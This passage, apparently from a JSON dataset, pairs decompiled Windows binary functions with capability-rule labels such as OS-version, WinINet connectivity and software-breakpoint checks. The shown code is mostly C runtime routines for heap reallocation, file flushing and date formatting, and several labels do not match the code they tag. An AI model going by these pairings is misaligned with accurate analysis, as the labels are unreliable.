iVar2 + 1U) {\n                fcn.0040bc50();\n                fcn.004149a0();\n            }\n            fcn.0040bc50();\n            fcn.0040bc50();\n            fcn.0040fc80();\n            fcn.00411ed0();\n            fcn.00411ee0();\n            fcn.00411ee0();\n            fcn.00411ee0();\n            fcn.00417133(&stack0xfffffed8, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n        }\n    }\n    uStack288 = 0x4114f5;\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 537
    },
    "0041158f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041158f(int32_t arg_8h, uint ExceptionInfo)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint var_4h;\n    \n    iVar4 = fcn.0040f262();\n    piVar1 = *(iVar4 + 0x54);\n    piVar7 = piVar1;\n    do {\n        if (*piVar7 == arg_8h) break;\n        piVar7 = piVar7 + 3;\n    } while (piVar7 < piVar1 + *0x441a2c * 3);\n    if ((piVar1 + *0x441a2c * 3 <= piVar7) || (*piVar7 != arg_8h)) {\n        piVar7 = NULL;\n    }\n    if ((piVar7 == NULL) || (pcVar2 = piVar7[2],  pcVar2 == NULL)) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(ExceptionInfo);\n    }\n    else if (pcVar2 == 0x5) {\n        piVar7[2] = 0;\n        uVar5 = 1;\n    }\n    else {\n        if (pcVar2 != 0x1) {\n            uVar5 = *(iVar4 + 0x58);\n            *(iVar4 + 0x58) = ExceptionInfo;\n            if (piVar7[1] == 8) {\n                if (*0x441a20 < *0x441a24 + *0x441a20) {\n                    iVar6 = *0x441a20 * 0xc;\n                    iVar8 = *0x441a20;\n                    do {\n                        *(iVar6 + 8 + *(iVar4 + 0x54)) = 0;\n                        iVar8 = iVar8 + 1;\n                        iVar6 = iVar6 + 0xc;\n                    } while (iVar8 < *0x441a24 + *0x441a20);\n                }\n                iVar8 = *piVar7;\n                uVar3 = *(iVar4 + 0x5c);\n                if (iVar8 == -0x3fffff72) {\n                    *(iVar4 + 0x5c) = 0x83;\n                }\n                else if (iVar8 == -0x3fffff70) {\n                    *(iVar4 + 0x5c) = 0x81;\n                }\n                else if (iVar8 == -0x3fffff6f) {\n                    *(iVar4 + 0x5c) = 0x84;\n                }\n                else if (iVar8 == -0x3fffff6d) {\n                    *(iVar4 + 0x5c) = 0x85;\n                }\n                else if (iVar8 == -0x3fffff73) {\n                    *(iVar4 + 0x5c) = 0x82;\n                }\n                else if (iVar8 == -0x3fffff71) {\n                    *(iVar4 + 0x5c) = 0x86;\n                }\n                else if (iVar8 == -0x3fffff6e) {\n                    *(iVar4 + 0x5c) = 0x8a;\n                }\n                (*pcVar2)(8, *(iVar4 + 0x5c));\n                *(iVar4 + 0x5c) = uVar3;\n            }\n            else {\n                piVar7[2] = 0;\n                (*pcVar2)(piVar7[1]);\n            }\n            *(iVar4 + 0x58) = uVar5;\n        }\n        uVar5 = 0xffffffff;\n    }\n    return uVar5;\n}\n",
        "token_count": 854
    },
    "004122bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004122bc(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43bd98, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 < *0x443060) {\n        piVar1 = (arg_8h_00 >> 5) * 4 + 0x4430a0;\n        iVar4 = (arg_8h_00 & 0x1f) * 0x24;\n        if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n            fcn.004175b9(arg_8h_00);\n            *(unaff_EBP + -4) = 0;\n            if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\ncode_r0x0041233c:\n                puVar3 = fcn.0041296c();\n                *puVar3 = 9;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n            }\n            else {\n                uVar2 = fcn.00417578(arg_8h_00);\n                iVar4 = (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar2);\n                if (iVar4 == 0) {\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                else {\n                    *(unaff_EBP + -0x1c) = 0;\n                }\n                if (*(unaff_EBP + -0x1c) != 0) {\n                    puVar3 = fcn.00412975();\n                    *puVar3 = *(unaff_EBP + -0x1c);\n                    goto code_r0x0041233c;\n                }\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041235c();\n            goto code_r0x00412372;\n        }\n    }\n    puVar3 = fcn.0041296c();\n    *puVar3 = 9;\ncode_r0x00412372:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 586
    },
    "00412b10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00412b10(char **arg_8h)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    uint8_t uVar3;\n    char **ppcVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    ppcVar4 = arg_8h;\n    pcVar7 = arg_8h[4];\n    if (arg_8h[1] < 0) {\n        arg_8h[1] = NULL;\n    }\n    var_4h = fcn.00412a65(pcVar7, 0, 1);\n    if (var_4h < 0) {\ncode_r0x00412bad:\n        var_8h = -1;\n    }\n    else {\n        pcVar8 = arg_8h[3];\n        if ((pcVar8 & 0x108) == 0) {\n            return var_4h - arg_8h[1];\n        }\n        pcVar9 = *arg_8h;\n        pcVar2 = arg_8h[2];\n        var_8h = pcVar9 - pcVar2;\n        if ((pcVar8 & 3) == 0) {\n            if (-1 < pcVar8) {\n                puVar5 = fcn.0041296c();\n                *puVar5 = 0x16;\n                goto code_r0x00412bad;\n            }\n        }\n        else if (((*(*((pcVar7 >> 5) * 4 + 0x4430a0) + 4 + (pcVar7 & 0x1f) * 0x24) & 0x80) != 0) &&\n                (pcVar8 = pcVar2,  pcVar2 < pcVar9)) {\n            do {\n                if (*pcVar8 == '\\n') {\n                    var_8h = var_8h + 1;\n                }\n                pcVar8 = pcVar8 + 1;\n            } while (pcVar8 < *arg_8h);\n        }\n        if (var_4h != 0) {\n            if ((*(arg_8h + 3) & 1) != 0) {\n                if (arg_8h[1] == NULL) {\n                    var_8h = 0;\n                }\n                else {\n                    pcVar8 = arg_8h[1] + (pcVar9 - pcVar2);\n                    piVar1 = (pcVar7 >> 5) * 4 + 0x4430a0;\n                    iVar10 = (pcVar7 & 0x1f) * 0x24;\n                    if ((*(iVar10 + 4 + *piVar1) & 0x80) != 0) {\n                        iVar6 = fcn.00412a65(pcVar7, 0, 2);\n                        if (iVar6 == var_4h) {\n                            pcVar7 = arg_8h[2];\n                            pcVar9 = pcVar8 + pcVar7;\n                            arg_8h = pcVar8;\n                            for (; pcVar7 < pcVar9; pcVar7 = pcVar7 + 1) {\n                                if (*pcVar7 == '\\n') {\n                                    arg_8h = arg_8h + 1;\n                                }\n                            }\n                            uVar3 = *(ppcVar4 + 0xd) & 0x20;\n                        }\n                        else {\n                            fcn.00412a65(pcVar7, var_4h, 0);\n                            pcVar7 = 0x200;\n                            if (((0x200 < pcVar8) || ((arg_8h[3] & 8) == 0)) || ((arg_8h[3] & 0x400) != 0)) {\n                                pcVar7 = arg_8h[6];\n                            }\n                            uVar3 = *(iVar10 + 4 + *piVar1) & 4;\n                            arg_8h = pcVar7;\n                        }\n                        pcVar8 = arg_8h;\n                        if (uVar3 != 0) {\n                            pcVar8 = arg_8h + 1;\n                        }\n                    }\n                    arg_8h = pcVar8;\n                    var_4h = var_4h - arg_8h;\n                }\n            }\n            var_8h = var_8h + var_4h;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 1030
    },
    "00412eb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.00412eb0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint32_t arg_10h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43bfa8, 0x14);\n    arg_ch_00 = *(unaff_EBP + 8);\n    if (arg_ch_00 == 0) {\n        fcn.0040b8de(*(unaff_EBP + 0xc));\n    }\n    else {\n        arg_10h = *(unaff_EBP + 0xc);\n        if (arg_10h == 0) {\n            fcn.0040cfb5(arg_ch_00);\n        }\n        else if (*0x4431fc == 3) {\n            do {\n                *(unaff_EBP + -0x1c) = 0;\n                if (arg_10h < 0xffffffe1) {\n                    fcn.0040f088(4);\n                    *(unaff_EBP + -4) = 0;\n                    iVar1 = fcn.0040fe0a(arg_ch_00);\n                    *(unaff_EBP + -0x20) = iVar1;\n                    if (iVar1 != 0) {\n                        if (arg_10h <= *0x4431dc) {\n                            iVar1 = fcn.0041030a(iVar1, arg_ch_00, arg_10h);\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.00410a2e(arg_10h);\n                                *(unaff_EBP + -0x1c) = iVar1;\n                                if (iVar1 != 0) {\n                                    uVar2 = *(arg_ch_00 + -4) - 1;\n                                    *(unaff_EBP + -0x24) = uVar2;\n                                    if (arg_10h <= uVar2) {\n                                        uVar2 = arg_10h;\n                                    }\n                                    fcn.0040bce0(*(unaff_EBP + -0x1c), arg_ch_00, uVar2);\n                                    uVar3 = fcn.0040fe0a(arg_ch_00);\n                                    *(unaff_EBP + -0x20) = uVar3;\n                                    fcn.0040fe35(uVar3, arg_ch_00);\n                                }\n                            }\n                            else {\n                                *(unaff_EBP + -0x1c) = arg_ch_00;\n                            }\n                        }\n                        if (*(unaff_EBP + -0x1c) == 0) {\n                            if (arg_10h == 0) {\n                                arg_10h = 1;\n                                *(unaff_EBP + 0xc) = 1;\n                            }\n                            arg_10h = arg_10h + 0xf & 0xfffffff0;\n                            *(unaff_EBP + 0xc) = arg_10h;\n                            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x4431ec, 0, arg_10h);\n                            *(unaff_EBP + -0x1c) = iVar1;\n                            if (iVar1 != 0) {\n                                uVar2 = *(arg_ch_00 + -4) - 1;\n                                *(unaff_EBP + -0x24) = uVar2;\n                                if (arg_10h <= uVar2) {\n                                    uVar2 = arg_10h;\n                                }\n                                fcn.0040bce0(*(unaff_EBP + -0x1c), arg_ch_00, uVar2);\n                                fcn.0040fe35(*(unaff_EBP + -0x20), arg_ch_00);\n                            }\n                        }\n                    }\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    fcn.00413018();\n                    if (*(unaff_EBP + -0x20) == 0) {\n                        if (arg_10h == 0) {\n                            arg_10h = 1;\n                        }\n                        arg_10h = arg_10h + 0xf & 0xfffffff0;\n                        *(unaff_EBP + 0xc) = arg_10h;\n                        uVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x4431ec, 0, arg_ch_00, arg_10h);\n                        *(unaff_EBP + -0x1c) = uVar3;\n                    }\n                }\n            } while (((*(unaff_EBP + -0x1c) == 0) && (*0x442a58 != 0)) && (iVar1 = fcn.0040c332(arg_10h),  iVar1 != 0));\n        }\n        else {\n            do {\n                iVar1 = 0;\n                if (arg_10h < 0xffffffe1) {\n                    if (arg_10h == 0) {\n                        arg_10h = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x4431ec, 0, arg_ch_00, arg_10h);\n                }\n            } while (((iVar1 == 0) && (*0x442a58 != 0)) && (iVar1 = fcn.0040c332(arg_10h),  iVar1 != 0));\n        }\n    }\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 1275
    },
    "0041305d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041305d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43bfb8, 0x10);\n    if (*0x4431fc == 3) {\n        fcn.0040f088(4);\n        *(unaff_EBP + -4) = 0;\n        iVar1 = *(unaff_EBP + 8);\n        iVar2 = fcn.0040fe0a(iVar1);\n        *(unaff_EBP + -0x20) = iVar2;\n        if (iVar2 != 0) {\n            *(unaff_EBP + -0x1c) = *(iVar1 + -4) + -9;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.004130ca();\n        if (*(unaff_EBP + -0x20) != 0) goto code_r0x004130bf;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapSize)(*0x4431ec, 0, *(unaff_EBP + 8));\ncode_r0x004130bf:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 326
    },
    "004130d3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004130d3(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43bfc8, 0x10);\n    uVar2 = *(unaff_EBP + 8) * *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x20) = uVar2;\n    if (uVar2 == 0) {\n        uVar2 = 1;\n    }\n    do {\n        iVar3 = 0;\n        *(unaff_EBP + -0x1c) = 0;\n        if (uVar2 < 0xffffffe1) {\n            if (*0x4431fc == 3) {\n                uVar2 = uVar2 + 0xf & 0xfffffff0;\n                *(unaff_EBP + 0xc) = uVar2;\n                arg_8h_00 = *(unaff_EBP + -0x20);\n                if (*0x4431dc < arg_8h_00) goto code_r0x00413148;\n                fcn.0040f088(4);\n                *(unaff_EBP + -4) = 0;\n                uVar1 = fcn.00410a2e(arg_8h_00);\n                *(unaff_EBP + -0x1c) = uVar1;\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.0041317d();\n                iVar3 = *(unaff_EBP + -0x1c);\n                if (iVar3 != 0) {\n                    fcn.0040cf50(iVar3, 0, *(unaff_EBP + -0x20));\n                    goto code_r0x00413148;\n                }\n            }\n            else {\ncode_r0x00413148:\n                if (iVar3 != 0) {\ncode_r0x00413188:\n                    fcn.0040f0f7();\n                    return;\n                }\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x4431ec, 8, uVar2);\n        }\n        if (((iVar3 != 0) || (*0x442a58 == 0)) || (iVar3 = fcn.0040c332(uVar2),  iVar3 == 0)) goto code_r0x00413188;\n    } while( true );\n}\n",
        "token_count": 609
    },
    "0041363f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041363f(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint noname_1;\n    \n    if (in_AL < '[') {\n        if (in_AL == 'Z') {\ncode_r0x00413830:\n            fcn.00418155();\ncode_r0x00413895:\n            fcn.00413570();\n            return 1;\n        }\n        if (in_AL < 'N') {\n            if (in_AL != 'M') {\n                if (in_AL == '%') {\n                    **in_ECX = 0x25;\n                    *in_ECX = *in_ECX + 1;\n                    *unaff_EBX = *unaff_EBX + -1;\n                    return 1;\n                }\n                if ((in_AL == 'A') || (in_AL == 'B')) goto code_r0x00413895;\n                if ((in_AL != 'H') && (in_AL != 'I')) {\n                    return 1;\n                }\n            }\ncode_r0x00413707:\n            fcn.004135c6(arg_14h);\n            return 1;\n        }\n        if (((in_AL == 'S') || (in_AL == 'U')) || (in_AL == 'W')) goto code_r0x00413707;\n        if (in_AL != 'X') {\n            if (in_AL != 'Y') {\n                return 1;\n            }\n            goto code_r0x00413707;\n        }\n    }\n    else {\n        if ('m' < in_AL) {\n            if (in_AL == 'p') goto code_r0x00413895;\n            if (in_AL == 'w') goto code_r0x00413707;\n            if (in_AL == 'x') {\n                if (arg_14h == 0) {\n                    noname_1 = 0;\n                }\n                else {\n                    noname_1 = 1;\n                }\n                goto code_r0x0041371c;\n            }\n            if (in_AL == 'y') goto code_r0x00413707;\n            if (in_AL != 'z') {\n                return 1;\n            }\n            goto code_r0x00413830;\n        }\n        if (in_AL == 'm') goto code_r0x00413707;\n        if ((in_AL == 'a') || (in_AL == 'b')) goto code_r0x00413895;\n        if (in_AL != 'c') {\n            if ((in_AL != 'd') && (in_AL != 'j')) {\n                return 1;\n            }\n            goto code_r0x00413707;\n        }\n        iVar1 = fcn.004138a5(arg_8h, arg_14h != 0, arg_ch, in_ECX, unaff_EBX, arg_10h, unaff_EDI, unaff_ESI, unaff_EBP, \n                             unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        if (*unaff_EBX == 0) {\n            return 0;\n        }\n        **in_ECX = 0x20;\n        *in_ECX = *in_ECX + 1;\n        *unaff_EBX = *unaff_EBX + -1;\n    }\n    noname_1 = 2;\ncode_r0x0041371c:\n    iVar1 = fcn.004138a5(arg_8h, noname_1, arg_ch, in_ECX, unaff_EBX, arg_10h, unaff_EDI, unaff_ESI, unaff_EBP, \n                         unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 920
    },
    "004138a5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_42h\n\nvoid __cdecl\nfcn.004138a5(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint32_t *puVar4;\n    uint8_t **ppuVar5;\n    uint uVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint *arg_8h_00;\n    char *pcVar9;\n    int32_t iVar10;\n    char cVar11;\n    uint8_t *puVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    ushort *puVar15;\n    int32_t unaff_EBP;\n    uint var_19h;\n    uint var_10h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_4h;\n    uint var_54h_2;\n    uint var_48h_2;\n    uint var_42h_2;\n    uint var_38h;\n    uint var_54h;\n    uint var_30h_2;\n    uint var_2ch_2;\n    uint var_48h;\n    uint var_42h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    \n    var_20h = 0x38;\n    var_24h = 0x43c120;\n    fcn.0040f0bc();\n    if (*(unaff_EBP + 0xc) == 0) {\n        uVar6 = *(*(unaff_EBP + 0x1c) + 0xa0);\n    }\n    else if (*(unaff_EBP + 0xc) == 1) {\n        uVar6 = *(*(unaff_EBP + 0x1c) + 0xa4);\n    }\n    else {\n        uVar6 = *(*(unaff_EBP + 0x1c) + 0xa8);\n    }\n    *(unaff_EBP + -0x20) = uVar6;\n    if (*(*(unaff_EBP + 0x1c) + 0xb0) == 1) {\n        puVar15 = *(unaff_EBP + 0x10);\n    }\n    else {\n        pcVar7 = _sym.imp.KERNEL32.dll_GetDateFormatA;\n        if (*(unaff_EBP + 0xc) == 2) {\n            pcVar7 = _sym.imp.KERNEL32.dll_GetTimeFormatA;\n        }\n        *(unaff_EBP + -0x30) = pcVar7;\n        puVar15 = *(unaff_EBP + 0x10);\n        *(unaff_EBP + -0x48) = puVar15[10] + 0x76c;\n        *(unaff_EBP + -0x46) = puVar15[8] + 1;\n        *(unaff_EBP + -0x42) = puVar15[6];\n        *(unaff_EBP + -0x40) = puVar15[4];\n        *(unaff_EBP + -0x3e) = puVar15[2];\n        *(unaff_EBP + -0x3c) = *puVar15;\n        *(unaff_EBP + -0x3a) = 0;\n        arg_8h_00 = &fcn.004138a5::var_24h;\n        iVar8 = (*pcVar7)(*(*(unaff_EBP + 0x1c) + 0xac), 0, unaff_EBP + -0x48, *(unaff_EBP + -0x20), 0, 0);\n        *(unaff_EBP + -0x2c) = iVar8;\n        if (iVar8 != 0) {\n            *(unaff_EBP + -0x34) = 0;\n            *(unaff_EBP + -4) = 0;\n            fcn.0040fc80();\n            *(unaff_EBP + -0x18) = &fcn.004138a5::var_24h;\n            *(unaff_EBP + -0x38) = &fcn.004138a5::var_24h;\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x8) {\n                arg_8h_00 = fcn.0040b8de(*(unaff_EBP + -0x2c));\n                if (arg_8h_00 == NULL) goto code_r0x00413a05;\n                *(unaff_EBP + -0x34) = 1;\n            }\n            *(unaff_EBP + -0x24) = arg_8h_00;\n            iVar8 = (**(unaff_EBP + -0x30))\n                              (*(*(unaff_EBP + 0x1c) + 0xac), 0, unaff_EBP + -0x48, *(unaff_EBP + -0x20), arg_8h_00, \n                               *(unaff_EBP + -0x2c));\n            iVar8 = iVar8 + -1;\n            if (0 < iVar8) {\n                piVar2 = *(unaff_EBP + 0x18);\n                piVar3 = *(unaff_EBP + 0x14);\n                do {\n                    if (*piVar2 == 0) break;\n                    **piVar3 = **(unaff_EBP + -0x24);\n                    *piVar3 = *piVar3 + 1;\n                    *(unaff_EBP + -0x24) = *(unaff_EBP + -0x24) + 1;\n                    *piVar2 = *piVar2 + -1;\n                    iVar8 = iVar8 + -1;\n                } while (0 < iVar8);\n            }\n            if (*(unaff_EBP + -0x34) != 0) {\n                fcn.0040cfb5(arg_8h_00);\n            }\n            goto code_r0x004139f9;\n        }\n    }\ncode_r0x00413a05:\n    cVar11 = **(unaff_EBP + -0x20);\n    if (cVar11 != '\\0') {\n        puVar4 = *(unaff_EBP + 0x18);\n        ppuVar5 = *(unaff_EBP + 0x14);\n        while (*puVar4 != 0) {\n            *(unaff_EBP + -0x19) = 0;\n            *(unaff_EBP + -0x28) = 0;\n            pcVar9 = *(unaff_EBP + -0x20);\n            uVar14 = 0;\n            do {\n                uVar13 = uVar14;\n                pcVar9 = pcVar9 + 1;\n                uVar14 = uVar13 + 1;\n            } while (*pcVar9 == cVar11);\n            *(unaff_EBP + -0x24) = pcVar9;\n            if (cVar11 < 'e') {\n                if (cVar11 == 'd') {\n                    if (uVar13 == 0) {\n                        *(unaff_EBP + -0x28) = 1;\n                    }\n                    else if (uVar13 != 1) {\n                        if (uVar13 == 2) {\n                            *(unaff_EBP + -0x19) = 0x61;\n                        }\n                        else if (uVar13 == 3) {\n                            *(unaff_EBP + -0x19) = 0x41;\n                        }\n                        goto code_r0x00413cbd;\n                    }\n                    *(unaff_EBP + -0x19) = 100;\n                    goto code_r0x00413cbd;\n                }\n                if (cVar11 != '\\'') {\n                    if (cVar11 != 'A') {\n                        if (cVar11 == 'H') {\n                            if (uVar13 == 0) {\n                                *(unaff_EBP + -0x28) = 1;\n                            }\n                            else if (uVar14 != 2) goto code_r0x00413cbd;\n                            *(unaff_EBP + -0x19) = 0x48;\n                        }\n                        else if (cVar11 == 'M') {\n                            if (uVar13 == 0) {\n                                *(unaff_EBP + -0x28) = 1;\n                            }\n                            else if (uVar13 != 1) {\n                                if (uVar13 == 2) {\n                                    *(unaff_EBP + -0x19) = 0x62;\n                                }\n                                else if (uVar13 == 3) {\n                                    *(unaff_EBP + -0x19) = 0x42;\n                                }\n                                goto code_r0x00413cbd;\n                            }\n                            *(unaff_EBP + -0x19) = 0x6d;\n                        }\n                        else if (cVar11 == 'a') goto code_r0x00413a66;\n                        goto code_r0x00413cbd;\n                    }\ncode_r0x00413a66:\n                    iVar8 = *(unaff_EBP + -0x20);\n                    iVar10 = fcn.00418220(iVar8, \"am/pm\");\n                    if (iVar10 == 0) {\n                        iVar8 = iVar8 + 5;\ncode_r0x00413ae4:\n                        *(unaff_EBP + -0x24) = iVar8;\n                    }\n                    else {\n                        iVar10 = fcn.00418220(iVar8, 0x43c110);\n                        if (iVar10 == 0) {\n                            iVar8 = iVar8 + 3;\n                            goto code_r0x00413ae4;\n                        }\n                    }\n                    *(unaff_EBP + -0x19) = 0x70;\n                    goto code_r0x00413cbd;\n                }\n                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + uVar14;\n                if ((uVar14 & 1) != 0) {\n                    puVar12 = *(unaff_EBP + -0x20);\n                    while( true ) {\n                        uVar1 = *puVar12;\n                        if ((uVar1 == 0) || (*puVar4 == 0)) goto code_r0x00413d1d;\n                        if (uVar1 == 0x27) break;\n                        if (((*(*(*(unaff_EBP + 8) + 0x48) + 1 + uVar1 * 2) & 0x80) == 0) || (*puVar4 < 2)) {\n                            puVar12 = *(unaff_EBP + -0x20);\n                        }\n                        else {\n                            puVar12 = *(unaff_EBP + -0x20) + 1;\n                            if (*puVar12 == 0) goto code_r0x004139f9;\n                            **ppuVar5 = uVar1;\n                            *ppuVar5 = *ppuVar5 + 1;\n                            *puVar4 = *puVar4 - 1;\n                        }\n                        **ppuVar5 = *puVar12;\n                        *ppuVar5 = *ppuVar5 + 1;\n                        puVar12 = puVar12 + 1;\n                        *(unaff_EBP + -0x20) = puVar12;\n                        *puVar4 = *puVar4 - 1;\n                    }\n                    *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 1;\n                }\n            }\n            else {\n                if (cVar11 == 'h') {\n                    if (uVar13 == 0) {\n                        *(unaff_EBP + -0x28) = 1;\n                    }\n                    else if (uVar14 != 2) goto code_r0x00413cbd;\n                    *(unaff_EBP + -0x19) = 0x49;\ncode_r0x00413cbd:\n                    if (*(unaff_EBP + -0x19) == '\\0') {\n                        puVar12 = *(unaff_EBP + -0x20);\n                        uVar1 = *puVar12;\n                        if (((*(*(*(unaff_EBP + 8) + 0x48) + 1 + uVar1 * 2) & 0x80) != 0) && (1 < *puVar4)) {\n                            puVar12 = puVar12 + 1;\n                            if (*puVar12 == 0) break;\n                            **ppuVar5 = uVar1;\n                            *ppuVar5 = *ppuVar5 + 1;\n                            *puVar4 = *puVar4 - 1;\n                        }\n                        **ppuVar5 = *puVar12;\n                        *ppuVar5 = *ppuVar5 + 1;\n                        *(unaff_EBP + -0x20) = puVar12 + 1;\n                        *puVar4 = *puVar4 - 1;\n                        goto code_r0x00413d1d;\n                    }\n                    iVar8 = fcn.0041363f(*(unaff_EBP + 8), *(unaff_EBP + 0x10), *(unaff_EBP + 0x1c), \n                                         *(unaff_EBP + -0x28));\n                    if (iVar8 == 0) break;\n                }\n                else {\n                    if (cVar11 == 'm') {\n                        if (uVar13 == 0) {\n                            *(unaff_EBP + -0x28) = 1;\n                        }\n                        else if (uVar14 != 2) goto code_r0x00413cbd;\n                        *(unaff_EBP + -0x19) = 0x4d;\n                        goto code_r0x00413cbd;\n                    }\n                    if (cVar11 == 's') {\n                        if (uVar13 == 0) {\n                            *(unaff_EBP + -0x28) = 1;\n                        }\n                        else if (uVar14 != 2) goto code_r0x00413cbd;\n                        *(unaff_EBP + -0x19) = 0x53;\n                        goto code_r0x00413cbd;\n                    }\n                    if (cVar11 != 't') {\n                        if (cVar11 == 'y') {\n                            if (uVar13 == 1) {\n                                *(unaff_EBP + -0x19) = 0x79;\n                            }\n                            else if (uVar13 == 3) {\n                                *(unaff_EBP + -0x19) = 0x59;\n                            }\n                        }\n                        goto code_r0x00413cbd;\n                    }\n                    if (*(puVar15 + 4) < 0xc) {\n                        puVar12 = 